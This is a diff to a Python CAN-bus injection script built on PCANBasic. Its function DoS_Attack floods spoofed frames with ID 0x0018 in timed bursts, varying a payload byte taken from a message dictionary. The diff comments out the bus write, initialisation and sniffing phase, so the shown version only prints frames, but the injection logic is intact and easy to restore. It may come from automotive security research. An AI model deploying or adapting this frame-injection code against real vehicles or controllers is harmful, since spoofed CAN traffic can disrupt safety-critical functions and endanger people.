@@ -50,87 +50,87 @@ def DoS_Attack(id, data):
         # all_datas += data[i]+ "\t"
 
     print(all_datas)
-    CAN.Write(CAN_BUS, DoS_DATA)
+    # CAN.Write(CAN_BUS, DoS_DATA)
     # time.sleep(time_offset)
 
 if __name__ == "__main__":
-    CAN = PCANBasic()                            #CANi
-    CAN_BUS = PCAN_USBBUS6
-    counter = 0
-    start_time = time.time()
-    ind = 0
-    injected = False
-    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
-    if result != PCAN_ERROR_OK:
-        # An error occurred, get a text describing the error and show it
-        #
-        print("oh No")
-        CAN.GetErrorText(result)
-        print(result)
-    while True:
-        # print("PCAN-USB Pro FD (Ch-1) was initialized")
-        mess = CAN.Read(CAN_BUS)
-        if hex(mess[1].ID) != "0x0":
-            if hex(mess[1].ID) == "0x18":
-                all_data = str(ind) + ')' + "\t"
-                offset = (time.time() - start_time)*1000
-                all_data += "{:.1f}".format(offset) + "\t"
-                id_hex = hex(mess[1].ID)[2:]
-                for _ in range(4 - len(id_hex)):
-                    id_hex = '0' + id_hex.upper()
-                for j in range(mess[1].LEN):
-                    data_hex = hex(mess[1].DATA[j])[2:]
-                    if j in msg_dict.keys():
-                        for _ in range(2 - len(data_hex)):
-                            data_hex = '0' + data_hex.upper()
+    # CAN = PCANBasic()                            #CANi
+    # CAN_BUS = PCAN_USBBUS6
+    # counter = 0
+    # start_time = time.time()
+    # ind = 0
+    # injected = False
+    # result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
+    # if result != PCAN_ERROR_OK:
+    #     # An error occurred, get a text describing the error and show it
+    #     #
+    #     print("oh No")
+    #     CAN.GetErrorText(result)
+    #     print(result)
+    # while True:
+    #     # print("PCAN-USB Pro FD (Ch-1) was initialized")
+    #     # mess = CAN.Read(CAN_BUS)
+    #     if hex(mess[1].ID) != "0x0":
+    #         if hex(mess[1].ID) == "0x18":
+    #             all_data = str(ind) + ')' + "\t"
+    #             offset = (time.time() - start_time)*1000
+    #             all_data += "{:.1f}".format(offset) + "\t"
+    #             id_hex = hex(mess[1].ID)[2:]
+    #             for _ in range(4 - len(id_hex)):
+    #                 id_hex = '0' + id_hex.upper()
+    #             for j in range(mess[1].LEN):
+    #                 data_hex = hex(mess[1].DATA[j])[2:]
+    #                 if j in msg_dict.keys():
+    #                     for _ in range(2 - len(data_hex)):
+    #                         data_hex = '0' + data_hex.upper()
         
-                        temp_val = data_hex
-                        temp_ind = msg_dict[j][0].index(temp_val)
-                        print(j, end=": ")
-                        print(msg_dict[j][1][temp_ind])
-                        if temp_val != using_bytes[j]:
-                            using_bytes[j] = temp_val
-                        print(using_bytes)
-                all_data += "\t" + data_hex.upper()
-                all_data += "\n"
-                time.sleep(0.1)
-                os.system("cls")
-        if time.time() - start_time > 1:
-            os.system("cls")
-            print("Phase #1 has done")
-            break
+    #                     temp_val = data_hex
+    #                     temp_ind = msg_dict[j][0].index(temp_val)
+    #                     print(j, end=": ")
+    #                     print(msg_dict[j][1][temp_ind])
+    #                     if temp_val != using_bytes[j]:
+    #                         using_bytes[j] = temp_val
+    #                     print(using_bytes)
+    #             all_data += "\t" + data_hex.upper()
+    #             all_data += "\n"    
+    #             time.sleep(0.1)
+    #             os.system("cls")
+    #     if time.time() - start_time > 1:
+    #         os.system("cls")
+    #         print("Phase #1 has done")
+    #         break
     cnt_b = 0
     while True:
         injection_id = "0018"
-        mess = CAN.Read(CAN_BUS)
+        # mess = CAN.Read(CAN_BUS)
         k = 10
-        if hex(mess[1].ID) == "0x18":
-        # if 0 == 0:
-            if cnt_b > 100:
-                print("Bye Bye")
-                break
+        # if hex(mess[1].ID) == "0x18":
+        if 0 == 0:
+            # if cnt_b > 100:
+            #     print("Bye Bye")
+            #     break
             first_injection = True
             if cnt_b % 4 == 0:       
-                using_bytes[5] = msg_dict[5][0][2]
-                for _ in range(5):
+                using_bytes[5] = msg_dict[5][0][3]
+                for _ in range(4):
                     time.sleep(0.03)
                     DoS_Attack(injection_id, using_bytes)
                     
             elif cnt_b % 4 == 1:
                 using_bytes[5] = msg_dict[5][0][0]
-                for _ in range(3):
+                for _ in range(2):
                     time.sleep(0.03)
                     DoS_Attack(injection_id, using_bytes)         
 
             elif cnt_b % 4 == 2:
-                using_bytes[5] = msg_dict[5][0][2]
+                using_bytes[5] = msg_dict[5][0][3]
                 for _ in range(4):
                     time.sleep(0.03)
                     DoS_Attack(injection_id, using_bytes)
 
             elif cnt_b % 4 == 3:
                 using_bytes[5] = msg_dict[5][0][0]
-                for _ in range(2):
+                for _ in range(3):
                     time.sleep(0.03)
                     DoS_Attack(injection_id, using_bytes)
             
